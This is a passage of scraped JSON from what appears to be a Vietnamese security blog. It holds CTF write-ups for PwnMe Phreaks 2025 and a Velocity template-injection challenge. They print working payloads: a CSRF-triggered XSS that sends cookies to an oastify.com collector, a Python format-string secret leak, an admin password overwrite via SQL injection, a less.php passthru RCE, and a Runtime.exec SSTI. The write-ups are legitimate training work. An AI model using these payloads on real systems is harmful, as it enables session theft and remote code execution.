","date":"2025-03-11T14:59:21Z","permalink":"https://kev1n1203.github.io/p/jasper-injection/","title":"Jasper Injection"},{"content":"Sau má»™t thÃ¡ng lu bu viá»‡c há»c, viá»‡c táº¿t, viá»‡c lÃ m\u0026hellip; MÃ¬nh bá» bÃª CTF khÃ¡ lÃ¢u mÃ  khÃ´ng thá»±c sá»± chÃº tÃ¢m vÃ o nÃ³. Nay mÃ¬nh má»›i láº­t Ä‘áº­t ngá»“i lÃ m cÃ¡c bÃ i táº¡i giáº£i pwnme phreaks,\u0026hellip; MÃ¬nh Ä‘á»™ng vÃ o 3 bÃ i, tuy nhiÃªn lÃ  cÃ³ 1 bÃ i blackbox mÃ  giáº£i end há» Ä‘Ã³ng luÃ´n website nÃªn Ä‘Ã nh chá»‹u Â¯\\_(ãƒ„)_/Â¯. Sau Ä‘Ã¢y lÃ  write up cá»§a mÃ¬nh vá»›i 2 chall whitebox mÃ  mÃ¬nh chÆ°a ká»‹p sol trong thá»i gian giáº£i diá»…n ra.\nSay My Name Má»™t challenge code báº±ng python vá»›i source code ngáº¯n, Ã½ tÆ°á»Ÿng khÃ¡ trá»±c quan. Vá»«a má»Ÿ code, mÃ¬nh Ä‘Ã£ tháº¥y bot.py (damn, láº¡i XSS) XSS with CSRF Khi render template python Ä‘á»ƒ dÃ­nh XSS thÃ¬ ta cáº§n cÃ³ option |safe trong expression, mÃ¬nh Ä‘i tÃ¬m trong code thÃ¬ chá»‰ cÃ³ giÃ¡ trá»‹ name trong templates/yourname.html lÃ  dÃ­nh: NÃ³ náº±m trong má»™t dáº¥u nhÃ¡y kÃ©p cá»§a document.location vÃ  trong tiáº¿p thuá»™c tÃ­nh onfocus cá»§a tháº» \u0026lt;a\u0026gt; Äoáº¡n code render template nÃ y lÃ  route /your-name báº±ng 1 POST request (tháº¿ thÃ¬ report cho bot kiá»ƒu chÃ³a gÃ¬)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 def sanitize_input(input_string): input_string = input_string.replace(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026#39;) input_string = input_string.replace(\u0026#39;\u0026gt;\u0026#39;, \u0026#39;\u0026#39;) input_string = input_string.replace(\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#39;) input_string = input_string.replace(\u0026#39;\u0026amp;\u0026#39;, \u0026#39;\u0026#39;) input_string = input_string.replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#39;\\\\\u0026#34;\u0026#39;) input_string = input_string.replace(\u0026#39;:\u0026#39;, \u0026#39;\u0026#39;) return input_string @app.route(\u0026#39;/your-name\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def your_name(): if request.method == \u0026#39;POST\u0026#39;: name = request.form.get(\u0026#39;name\u0026#39;) return Response(render_template(\u0026#39;your-name.html\u0026#39;, name=sanitize_input(name)), content_type=\u0026#39;text/html\u0026#39;)\\ Vá»›i hÃ m sanitize_input, mÃ¬nh sáº½ khÃ´ng thá»ƒ thoÃ¡t khá»i Ä‘Æ°á»£c sá»± kiá»‡n onfocus hay má»Ÿ tháº» má»›i. NÃªn lÃºc nÃ y mÃ¬nh Ä‘Ã£ máº¥t khÃ¡ nhiá»u thá»i gian chá»‰ Ä‘á»ƒ Ä‘i tÃ¬m cÃ¡ch bypass, Ä‘i search mxss cá»§a firefox, xss trÃªn firefox cÃ¡c kiá»ƒu Ä‘á»ƒ nháº­n ra nÃ³ khÃ´ng hoáº¡t Ä‘á»™ng nhÆ° tháº¿ =))) Äoáº¡n code report vÃ  visit nÃ³ váº«n giá»‘ng cÃ¡c chall XSS thÆ°á»ng tháº¥y nÃªn mÃ¬nh khÃ´ng nháº¯c Ä‘áº¿n ná»¯a, cÃ²n cÃ¢u há»i Ä‘áº·t ra lÃ  pháº£i report cho con bot nhÆ° nÃ o Ä‘á»ƒ nÃ³ POST Ä‘áº¿n /your-name thÃ¬ mÃ¬nh sáº½ dÃ¹ng CSRF.\nMÃ¬nh táº¡o response cÃ³ chá»©a payload CSRF cÆ¡ báº£n trÃªn request repo: 1 2 3 4 5 6 \u0026lt;form action=\u0026#34;http://192.168.92.187:5000/your-name\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;name\u0026#34; value=\u0026#34;133337\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; NÃ©m cho con bot link html nÃ y lÃ  Ä‘Æ°á»£c: ÄÃ£ cÃ³ thá»ƒ Ä‘Æ°a cho con bot payload, giá» mÃ¬nh sáº½ tÃ¬m cÃ¡ch bypass XSS. MÃ¬nh Ä‘Ã£ nghÄ© khÃ´ng thá»ƒ nÃ o chÃ¨n thÃªm Ä‘Æ°á»£c cÃ¡i gÃ¬ vÃ o cÃ¡i URL kia, nÃªn Ã½ tÆ°á»Ÿng ban Ä‘áº§u cá»§a mÃ¬nh lÃ  trigger sá»± kiá»‡n onfocus báº±ng cÃ¡ch thÃªm fragment lÃ  id cá»§a tháº» Ä‘Ã³ vÃ o URL (Document), sau Ä‘Ã³ XSS táº¡i trang mÃ  nÃ³ redirect sang lÃ  behindthename.com: Ai cÅ©ng biáº¿t lÃ  idea nÃ y khÃ´ng giÃ²n tÃ­ nÃ o, site kia khÃ´ng dÃ­nh XSS, cÅ©ng nhÆ° mÃ¬nh váº«n bá»‹ filter nÃªn khÃ´ng Ä‘iá»n Ä‘c payload tÃ¹y Ã½. NhÃ¬n láº¡i filter, mÃ¬nh Ä‘Ã£ quÃªn máº¥t lÃ  nÃ³ khÃ´ng há» filter nhÃ¡y kÃ©p mÃ  chá»‰ thÃªm \\ vÃ o trÆ°á»›c, mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ bypass báº±ng \\\u0026quot; rá»“i comment Ä‘oáº¡n Ä‘áº±ng sau láº¡i lÃ  cÃ³ thá»ƒ XSS: JS code sáº½ Ä‘Æ°á»£c trigger trÆ°á»›c khi redirect sang https://www.behindthename.com/ Giá» thÃ¬ chá»‰ cáº§n fetch thÃ´i, lÆ°u Ã½ vÃ¬ chall cháº·n cáº£ : nÃªn khi fetch cÃ³ thá»ƒ bá» https: Ä‘i mÃ  chá»‰ cáº§n //URL lÃ  Ä‘Æ°á»£c: Giá» thÃ¬ láº¥y token cá»§a bot thÃ´i:\n1 2 3 4 5 6 \u0026lt;form action=\u0026#34;http://127.0.0.1:5000/your-name#behindthename-redirect\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;name\u0026#34; value=\u0026#39;1\\\u0026#34;;fetch(`//vvu7nop54qkhrr3xp05tf2qqjhp8dz1o.oastify.com/?1337=`+document.cookie)//\u0026#39; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; MÃ¬nh Ä‘Ã£ cÃ³ X-Admin-Token lÃ  8657e9a9dec84afb8710a1a4a9e09efb\nFormat String Python Vá»›i X-Admin-Token, mÃ¬nh Ä‘Ã£ cÃ³ thá»ƒ truy cáº­p Ä‘Æ°á»£c route /admin\n1 2 3 4 5 6 7 8 9 10 def run_cmd(): # I will do that later pass @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def admin(): if request.cookies.get(\u0026#39;X-Admin-Token\u0026#39;) != X_Admin_Token: return \u0026#39;Access denied\u0026#39;, 403 prompt = request.args.get(\u0026#39;prompt\u0026#39;) return render_template(\u0026#39;admin.html\u0026#39;, cmd=f\u0026#34;{prompt if prompt else \u0026#39;prompt$/\u0026gt;\u0026#39;}{run_cmd()}\u0026#34;.format(run_cmd)) Route nÃ y nháº­n args tá»« URL lÃ  prompt, sau Ä‘Ã³ render ra giÃ¡ trá»‹ cmd vÃ  format 2 láº§n: 1 láº§n vá»›i f\u0026quot;\u0026quot; vÃ  1 láº§n vá»›i .format(run_cmd) Káº¿t quáº£ sáº½ cÃ³ None bá»Ÿi vÃ¬ hÃ m run_cmd() khÃ´ng cháº¡y má»™t thá»© gÃ¬ cáº£ Táº¡i láº§n Ä‘áº§u tiÃªn, náº¿u nhÆ° ta Ä‘á»ƒ {} thÃ¬ táº¡i láº§n format thá»© 2 thá»© Ä‘Æ°á»£c thay vÃ o lÃ  hÃ m run_cmd, dáº«n Ä‘áº¿n viá»‡c xáº£y ra format string: Cá»™ng vá»›i viá»‡c flag Ä‘Æ°á»£c Ä‘á»ƒ trong environment, ta confirm Ä‘Ã¢y lÃ  lá»—i format string vÃ¬ vá»›i format string ta khÃ´ng thá»ƒ RCE. Äáº§u tiÃªn mÃ¬nh cá»© nghÄ© lÃ  sáº½ khÃ´ng control Ä‘Æ°á»£c cÃ¡c attribute vÃ¬ mÃ¬nh cáº§n chÃ¨n vÃ o bÃªn format() vÃ­ dá»¥ nhÆ° .format(run_cmd.__init__), nhÆ°ng mÃ¬nh khÃ´ng ngá» lÃ  cÃ³ thá»ƒ call trá»±c tiáº¿p tá»« bÃªn trong pháº§n format (kiáº¿n thá»©c má»›i) Giá» ta sáº½ Ä‘i tÃ¬m chain Ä‘á»ƒ tiáº¿n hÃ nh leak environment, ngon nháº¥t lÃ  .__globals__[os].environ, tuy nhiÃªn táº¡i Ä‘Ã¢y thÃ¬ attribute globals khÃ´ng cÃ³ module os nÃªn ta pháº£i Ä‘i tÃ¬m cÃ¡i khÃ¡c váº­y: PhiÃªn báº£n Ä‘áº¹p hÆ¡n:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x717c0d982220\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;/app/app.py\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;Flask\u0026#39;: \u0026lt;class \u0026#39;flask.app.Flask\u0026#39;\u0026gt;, \u0026#39;render_template\u0026#39;: \u0026lt;function render_template at 0x717c0c5c7160\u0026gt;, \u0026#39;request\u0026#39;: \u0026lt;Request \u0026#39;http://192.168.92.187:5000/admin?prompt={.__globals__}\u0026#39; [GET]\u0026gt;, \u0026#39;Response\u0026#39;: \u0026lt;class \u0026#39;flask.wrappers.Response\u0026#39;\u0026gt;, \u0026#39;redirect\u0026#39;: \u0026lt;function redirect at 0x717c0c7591f0\u0026gt;, \u0026#39;url_for\u0026#39;: \u0026lt;function url_for at 0x717c0c7c3f70\u0026gt;, \u0026#39;visit_report\u0026#39;: \u0026lt;function visit_report at 0x717c0c58d790\u0026gt;, \u0026#39;token_hex\u0026#39;: \u0026lt;function token_hex at 0x717c0cb6e9d0\u0026gt;, \u0026#39;X_Admin_Token\u0026#39;: \u0026#39;8657e9a9dec84afb8710a1a4a9e09efb\u0026#39;, \u0026#39;run_cmd\u0026#39;: \u0026lt;function run_cmd at 0x717c0d9cd040\u0026gt;, \u0026#39;sanitize_input\u0026#39;: \u0026lt;function sanitize_input at 0x717c0c2698b0\u0026gt;, \u0026#39;app\u0026#39;: \u0026lt;Flask \u0026#39;app\u0026#39;\u0026gt;, \u0026#39;admin\u0026#39;: \u0026lt;function admin at 0x717c0c272940\u0026gt;, \u0026#39;index\u0026#39;: \u0026lt;function index at 0x717c0c2729d0\u0026gt;, \u0026#39;your_name\u0026#39;: \u0026lt;function your_name at 0x717c0c272b80\u0026gt;, \u0026#39;report\u0026#39;: \u0026lt;function report at 0x717c0c272c10\u0026gt; } MÃ y mÃ² má»™t lÃºc thÃ¬ mÃ¬nh cÅ©ng tháº¥y tá»« attribute Flask cÃ³ thá»ƒ dáº«n Ä‘áº¿n os: {.__globals__[Flask].__init__.__globals__[os].environ} pwnshop Má»™t challenge PHP vá»›i lÆ°á»£ng source khÃ¡ Ä‘á»“ sá»™ so vá»›i chall phÃ­a trÃªn, cÃ³ Ä‘áº§y Ä‘á»§ cÃ¡c chá»©c nÄƒng cá»§a má»™t shop online. Má»¥c tiÃªu cá»§a chÃºng ta lÃ  RCE: Má»™t sá»‘ folder Ä‘Ã¡ng chÃº Ã½ trong src: API: Chá»©a routing cho cÃ¡c api CRUD táº¡i website vÃ  code chá»©c nÄƒng/phÃ¢n quyá»n sá»­ dá»¥ng chá»©c nÄƒng, lÃ  controller cho toÃ n bá»™ project Auth: Code config JWT vÃ  set cookie khi login thÃ nh cÃ´ng Models: Chá»©a cÃ¡c Ä‘á»‘i tÆ°á»£ng vÃ  cÃ¡c hÃ m query DB vá»›i tá»«ng Ä‘á»‘i tÆ°á»£ng Security: Filter file upload vÃ  XML file SQL Injection to Admin role Sau khi Ä‘á»c qua má»™t lÆ°á»£t, mÃ¬nh táº­p trung chá»§ yáº¿u vÃ o file Api/Rest/RestController.php vÃ¬ nÃ³ chá»©a routing vÃ  cÃ¡c hÃ m Ä‘Æ°á»£c sá»­ dá»¥ng trong cÃ¡c api tÆ°Æ¡ng á»©ng. Má»™t sá»‘ hÃ m sáº½ láº¥y tá»« Models. CÃ²n Security mÃ¬nh khÃ´ng Ä‘á»ƒ Ã½ láº¯m vÃ¬ Ä‘oáº¡n code filter XML khÃ¡ dÃ i vÃ  lan man, cÃ²n file upload thÃ¬ nghá»‰ Ä‘i vÃ¬ há» whitelist rá»“i. Táº¡i route /api/orders/search sá»­ dá»¥ng method searchOrders, ta cÃ³ thá»ƒ khai thÃ¡c SQL Injection qua param limit: Táº¡i Ä‘Ã¢y searchOrders gá»i Ä‘áº¿n function search trong model Order, giÃ¡ trá»‹ cá»§a param limit Ä‘Æ°á»£c ná»‘i vÃ o mÃ  khÃ´ng cÃ³ filter gÃ¬: KhÃ´ng nhÆ° tÃ­nh nÄƒng search cá»§a model Product, param limit Ä‘Æ°á»£c Ã©p vá» int trÆ°á»›c khi ná»‘i chuá»—i: Ta hoÃ n toÃ n cÃ³ thá»ƒ stacked query, quÃ¡ ngon: MÃ¬nh láº­p tá»©c nghÄ© Ä‘áº¿n viá»‡c write file to RCE vá»›i into dumpfile hoáº·c into outfile, nhÆ°ng mÃ¬nh khÃ´ng write Ä‘Æ°á»£c. Ngá»“i 1 lÃºc thÃ¬ mÃ¬nh tháº¥y lÃ­ do lÃ  vÃ¬ user DB khÃ´ng Ä‘á»§ quyá»n Ä‘á»ƒ write, náº¿u nhÆ° dÃ¹ng root Ä‘á»ƒ vÃ o mysql báº±ng mysql -u root thÃ¬ ta cÃ³ thá»ƒ ghi Ä‘Æ°á»£c. CÃ²n user cá»§a ta Ä‘ang lÃ  user-pwnshop chá»‰ cÃ³ quyá»n thao tÃ¡c db pwnshop chá»© khÃ´ng cÃ³ quyá»n FILE -\u0026gt; khÃ´ng thá»ƒ Ä‘á»c/ghi file: NhÃ¬n tháº¥y báº£ng users cÃ³ admin, mÃ¬nh Ä‘á»•i máº­t kháº©u admin thÃ nh 12345678 Ä‘á»ƒ log in luÃ´n: 1 update users set password = \u0026#39;$2y$10$sB/I2oDHtik8W2fWX3odE.FSDq9fGJ6U5HWOMfhSIhLkYMNY.0o5m\u0026#39; where username=\u0026#39;admin\u0026#39; Váº­y lÃ  mÃ¬nh cÃ³ Admin =))\n0 day in less.php Library leads to RCE MÃ¬nh Ä‘Ã£ stuck á»Ÿ SQLi mÃ  khÃ´ng leo lÃªn Ä‘Æ°á»£c RCE, sau Ä‘Ã³ end giáº£i thÃ¬ author cÃ³ push lÃªn solution: Oh damn, cÃ³ láº½ SQLi khÃ´ng pháº£i lÃ  intended. Anyways, khÃ´ng cÃ³ cÃ¡ch nÃ y thÃ¬ cÃ³ cÃ¡ch khÃ¡c thÃ´i Â¯\\_(ãƒ„)_/Â¯ CÃ¡i mÃ¬nh Ä‘á»ƒ Ã½ lÃ  thÆ° viá»‡n less.php cÃ³ thá»ƒ trigger RCE qua file less vÃ  tÃªn thÆ° má»¥c import. Tiá»‡n lá»£i lÃ  khi lÃªn admin ta sáº½ tháº¥y ta cÃ³ quyá»n config báº±ng cÃ¡ch upload less file vÃ  cáº¥u hÃ¬nh import directories: Vá» cÆ¡ báº£n, khi ta táº¡o má»™t thÆ° má»¥c Ä‘á»ƒ import, ta Ä‘Æ°á»£c Ä‘iá»n vÃ o Ä‘Æ°á»ng dáº«n váº­t lÃ½ vÃ  import path, cÃ¡c file CSS muá»‘n import sáº½ cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘Æ°á»ng dáº«n tá»« import path. Chá»©c nÄƒng trigger RCE náº±m táº¡i function chá»‰nh sá»­a CSS vÃ  apply CSS, vá»›i route xá»­ lÃ½ lÃ  /api/settings/css: Äi sÃ¢u vÃ o code, route /api/settings/css call Ä‘áº¿n method updateCustomCss táº¡i RestController.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #[Privilege(permissions: [Permissions::MANAGE_APPEARANCE])] private function updateCustomCss($currentUser, $data) { try { if (!isset($data[\u0026#39;css\u0026#39;])) { return [ \u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;CSS is required\u0026#39;, \u0026#39;status\u0026#39; =\u0026gt; 400 ]; } $result = $this-\u0026gt;settings-\u0026gt;updateCustomCss($data[\u0026#39;css\u0026#39;]); ..... } Tiáº¿p tá»¥c call Ä‘áº¿n method updateCustomCss -\u0026gt; generateCSS táº¡i Model Settings:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public function updateCustomCss($css) { try { $customLessPath = __DIR__ . \u0026#39;/../../resources/less/custom.less\u0026#39;; file_put_contents($customLessPath, $css); return $this-\u0026gt;generateCSS(); } catch (Exception $e) { return false; } } private function generateCSS() { try { $themeCssPath = __DIR__ . \u0026#39;/../../public/assets/css/main.css\u0026#39;; $css = file_get_contents($themeCssPath); $customLessPath = __DIR__ . \u0026#39;/../../resources/less/custom.less\u0026#39;; if (file_exists($customLessPath)) { $customLess = file_get_contents($customLessPath); $parser = new \\Less_Parser(); $importDirs = $this-\u0026gt;getImportDirectories(); $parser-\u0026gt;SetImportDirs($importDirs); $parser-\u0026gt;parse($customLess); $customCSS = $parser-\u0026gt;getCss(); $css .= \u0026#34;\\n/* Custom CSS */\\n\u0026#34; . $customCSS; } .... } catch (Exception $e) { return false; } } Táº¡i Ä‘Ã¢y Less_Parser cÃ³ nhiá»‡m vá»¥ sá»­ dá»¥ng import directories Ä‘Ã£ cÃ³ vÃ  set vÃ o import dir, vÃ  láº¥y ná»™i dung css cá»§a chÃºng ta Ä‘á»ƒ táº¡o thÃ nh Css trong method getCss() Tá»« Ä‘Ã¢y thÃ¬ chÃºng ta sáº½ xuáº¥t hiá»‡n lá»— há»•ng khi sá»­ dá»¥ng function data-uri trong Less, vá»‘n Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ nhÃºng file vÃ o CSS theo path hoáº·c nhÃºng báº±ng base64. Táº¡i Less_Tree_Call::compile khi match tháº¥y method data-uri sáº½ set tÃªn function lÃ  datauri vÃ  call Ä‘áº¿n method Less_Functions::datauri: HÃ m Ä‘Ã³ sáº½ tiáº¿p tá»¥c call Ä‘áº¿n Less_FileManager::getFilePath Táº¡i hÃ m nÃ y thÃ¬ Ä‘Æ°á»ng dáº«n $rooturi Ä‘Æ°á»£c láº¥y tá»« $import_dirs Ä‘Æ°á»£c kiá»ƒm tra cÃ³ pháº£i hÃ m hay khÃ´ng, náº¿u cÃ³ thÃ¬ sáº½ sá»­ dá»¥ng nhÆ° lÃ  1 function vá»›i param lÃ  $filename lÃ  giÃ¡ trá»‹ náº±m trong function data-uri Ä‘Ã£ Ä‘Æ°á»£c extract tá»« method trÆ°á»›c Ä‘Ã³: NhÆ° váº­y vá» cÆ¡ báº£n, ta cáº§n táº¡o má»™t import directories cÃ³ giÃ¡ trá»‹ lÃ  1 hÃ m nháº­n vÃ o 1 tham sá»‘, cá»™ng vá»›i viá»‡c truyá»n dá»¯ liá»‡u vÃ o bÃªn trong function data-uri, khi LESS kiá»ƒm tra tÃªn file sáº½ trigger code injection. Äá»ƒ RCE thÃ¬ ta Æ°u tiÃªn sá»­ dá»¥ng cÃ¡c hÃ m hiá»ƒn thá»‹ cÃ¢u lá»‡nh mÃ  cÃ³ kháº£ nÄƒng nháº­n vÃ o 1 tham sá»‘: system, passthru. MÃ¬nh táº¡o import directories cÃ³ tÃªn import path lÃ  passthru: Sau Ä‘Ã³ chá»‰ cáº§n trigger lá»—i RCE thÃ´ng qua api custom CSS lÃ  cÃ³ thá»ƒ RCE: Lá»¥m flag báº±ng command /getflag PWNME Funny Walkaround VÃ¬ sink lá»— há»•ng náº±m táº¡i method Less_FileManager::getFilePath, táº¥t cáº£ cÃ¡c funtions call Ä‘áº¿n method nÃ y Ä‘á»u cÃ³ thá»ƒ dáº«n Ä‘áº¿n RCE, quan sÃ¡t trong lib/Less/Functions.php thÃ¬ ngoÃ i method datauri thÃ¬ cÃ²n cÃ³ method getImageSize sá»­ dá»¥ng Ä‘áº¿n method nÃ y, cÃ¹ng vá»›i tham sá»‘ truyá»n vÃ o tÆ°Æ¡ng tá»±: CÃ³ 3 function cá»§a less sá»­ dá»¥ng method nÃ y, bao gá»“m:\nimage-size: imagesize image-width: imagewidth image-height: imageheight NÃªn ngoÃ i data-uri(), ta hoÃ n toÃ n cÃ³ thá»ƒ sá»­ dá»¥ng 3 function nÃ y, cÃ¡ch sá»­ dá»¥ng cÅ©ng tÆ°Æ¡ng tá»±, tuy nhiÃªn sáº½ vÄƒng ra kha khÃ¡ lá»—i: ","date":"2025-03-03T00:00:00Z","permalink":"https://kev1n1203.github.io/p/pwnme-phreaks-2025/","title":"Pwnme Phreaks CTF 2025 write up"},{"content":"hihi ÄÃ¢y lÃ  má»™t challenge whitebox, cung cáº¥p cho mÃ¬nh source code, cung cáº¥p má»™t cÃ¡ch khÃ¡ hay Ä‘á»ƒ khai thÃ¡c SSTI Challenge sá»­ dá»¥ng Springboot Ä‘á»ƒ build web, vá»›i 1 route duy nháº¥t táº¡i index, táº¡i phÆ°Æ¡ng thá»©c POST nháº­n Ä‘áº§u vÃ o lÃ  data vÃ  xá»­ lÃ½ Ä‘á»ƒ in ra chuá»—i hello tÃªn ngÆ°á»i dÃ¹ng vÃ  thá»i gian:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @PostMapping({\u0026#34;/\u0026#34;}) @ResponseBody public String hello(@RequestParam(\u0026#34;data\u0026#34;) String data) throws IOException { String hexString = new String(Base64.getDecoder().decode(data)); byte[] byteArray = Encode.hexToBytes(hexString); ByteArrayInputStream bis = new ByteArrayInputStream(byteArray); ObjectInputStream ois = new SecureObjectInputStream(bis); String name; try { Users user = (Users)ois.readObject(); name = user.getName(); } catch (Exception var13) { throw new RuntimeException(var13); } if (name.toLowerCase().contains(\u0026#34;#\u0026#34;)) { return \u0026#34;But... For what?\u0026#34;; } else { String templateString = \u0026#34;Hello, \u0026#34; + name + \u0026#34;. Today is $date\u0026#34;; Velocity.init(); VelocityContext ctx = new VelocityContext(); LocalDate date = LocalDate.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern(\u0026#34;MMMM dd, yyyy\u0026#34;); String formattedDate = date.format(formatter); ctx.put(\u0026#34;date\u0026#34;, formattedDate); StringWriter out = new StringWriter(); Velocity.evaluate(ctx, out, \u0026#34;test\u0026#34;, templateString); return out.toString(); } } GiÃ¡ trá»‹ tá»« param data Ä‘Æ°á»£c base64 decode, sau Ä‘Ã³ chuyá»ƒn tá»« dáº¡ng hex sang bytes array vÃ  Ä‘Æ°á»£c deserialize (sus) Láº¥y giÃ¡ trá»‹ name trong object thu Ä‘Æ°á»£c, vÃ  ná»‘i chuá»—i vÃ o templateString trÆ°á»›c khi render -\u0026gt; SSTI. Tuy nhiÃªn trÆ°á»›c khi Ä‘Æ°á»£c ná»‘i chuá»—i thÃ¬ giÃ¡ trá»‹ name Ä‘Æ°á»£c kiá»ƒm tra xem cÃ³ chá»©a kÃ½ tá»± # khÃ´ng, náº¿u khÃ´ng cÃ³ kÃ½ tá»± nÃ y ta sáº½ khÃ´ng thá»ƒ dÃ¹ng Ä‘Æ°á»£c cÃ¡c syntax cá»§a tempalte nhÆ° #set,\u0026hellip; KhÃ´ng nhá»¯ng váº­y, táº¡i class SecureObjectInputStream khi invoke method resolveClass thÃ¬ class sáº½ kiá»ƒm tra xem class Ä‘áº§u tiÃªn pháº£i lÃ  Users thÃ¬ má»›i cho phÃ©p tiáº¿u tá»¥c vÃ o method resolveClass Ä‘á»ƒ tiáº¿p tá»¥c deserialize\n1 2 3 4 5 6 7 8 9 10 @Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass osc) throws IOException ,ClassNotFoundException{ List\u0026lt;String\u0026gt; approvedClass = new ArrayList\u0026lt;String\u0026gt;(); approvedClass.add(Users.class.getName()); if(!approvedClass.contains(osc.getName())){ throw new InvalidClassException(\u0026#34;Can not deserialize this class! \u0026#34;,osc.getName()); } return super.resolveClass(osc); } NhÃ¬n chung lÃ  Ä‘á»ƒ attack deserialize thÃ¬ khÃ³ =)) NhÆ°ng trÆ°á»›c háº¿t thÃ¬ mÃ¬nh cÅ©ng cáº§n pháº£i code láº¡i script Ä‘á»ƒ gen ra Ä‘Æ°á»£c data Ä‘Ã£, object Users sáº½ Ä‘i theo flow sau:\n1 serialize -\u0026gt; bytestohex -\u0026gt; base64 encode Resource tá»« source code gá»‘c Ä‘Ã£ cÃ³ gáº§n nhÆ° Ä‘á»§ cáº£, mÃ¬nh táº¡o thÃªm method bytesToHex táº¡i class Encode:\n1 2 3 4 5 6 7 8 9 10 11 public static String bytesToHex(byte[] bytes) { StringBuilder hexString = new StringBuilder(2 * bytes.length); for (byte b : bytes) { String hex = Integer.toHexString(b \u0026amp; 0xFF); if (hex.length() == 1) { hexString.append(\u0026#39;0\u0026#39;); } hexString.append(hex); } return hexString.toString(); } Main method cá»§a mÃ¬nh nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Users user = new Users(); user.setName(\u0026#34;user1337\u0026#34;); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(user); oos.flush(); oos.close(); byte[] byteArray = bos.toByteArray(); String hexString = Encode.bytesToHex(byteArray); String data = Base64.getEncoder().encodeToString(hexString.getBytes()); System.out.println(data); Ta cÃ³ base64 value cá»§a giÃ¡ trá»‹ serialize lÃ  YWNlZDAwMDU3MzcyMDAxNjYzNmY2ZDJlNjk3MzY5NzQ2NDc0NzUyZTY4Njk2ODY5MmU1NTczNjU3MjczNzA4NTI1ZDliYTNiZWZiMzAyMDAwMTRjMDAwNDZlNjE2ZDY1NzQwMDEyNGM2YTYxNzY2MTJmNmM2MTZlNjcyZjUzNzQ3MjY5NmU2NzNiNzg3MDc0MDAwODc1NzM2NTcyMzEzMzMzMzc= Giá» mÃ¬nh cáº§n tÃ¬m cÃ¡ch Ä‘á»ƒ exploit SSTI, vá»›i viá»‡c khÃ´ng thá»ƒ sá»­ dá»¥ng dáº¥u # thÃ¬ mÃ¬nh khÃ´ng thá»ƒ táº¡o Ä‘Æ°á»£c biáº¿n nÃ o Ä‘á»ƒ gá»i method tá»« biáº¿n Ä‘Ã³ ra vÃ¬ khÃ´ng dÃ¹ng Ä‘Æ°á»£c #set() MÃ¬nh chuyá»ƒn qua viá»‡c sá»­ dá»¥ng nhá»¯ng gÃ¬ mÃ¬nh cÃ³, cá»¥ thá»ƒ lÃ  biáº¿n $date Ä‘Æ°á»£c khai bÃ¡o Ä‘á»“ng thá»i trong templateString, vá»›i kiá»ƒu dá»¯ liá»‡u lÃ  String. ÄÃ¢y lÃ  má»™t variable hoÃ n háº£o mÃ¬nh cÃ³ thá»ƒ lá»£i dá»¥ng Ä‘á»ƒ cÃ³ thá»ƒ invoke Ä‘áº¿n Runtime.exec. Payload mÃ¬nh tÃ¬m kiáº¿m vÃ  tham kháº£o táº¡i: https://blog.csdn.net/weixin_39190897/article/details/139707252 Ban Ä‘áº§u mÃ¬nh confirm bug báº±ng viá»‡c táº¡o file táº¡i /tmp:\n1 $date.getClass().forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;getRuntime\u0026#39;,null).invoke(null,null).exec(\u0026#39;touch /tmp/1337\u0026#39;) ÄÆ°a nÃ³ vÃ o script vÃ  gá»­i, mÃ¬nh tháº¥y cÃ¢u lá»‡nh Ä‘Æ°á»£c thá»±c thi thÃ nh cÃ´ng vÃ¬ káº¿t quáº£ tráº£ vá» lÃ  pid cá»§a tiáº¿n trÃ¬nh thá»±c hiá»‡n táº¡o file: File /tmp/1337 Ä‘Ã£ xuáº¥t hiá»‡n, confirm payload RCE thÃ nh cÃ´ng: Tuy Ä‘Ã£ RCE, nhÆ°ng challenge config iptables Ä‘á»ƒ cháº·n connection qua chain DROP (cÅ©ng na nÃ¡ chall niceray), nÃªn mÃ¬nh khÃ´ng reverse shell mÃ  Ä‘i tÃ¬m cÃ¡ch láº¥y ná»™i dung file flag qua webroot. Trong Springboot thÃ¬ Ä‘á»ƒ xuáº¥t hiá»‡n webroot, ta cáº§n Ä‘Æ°a file vÃ o thÆ° 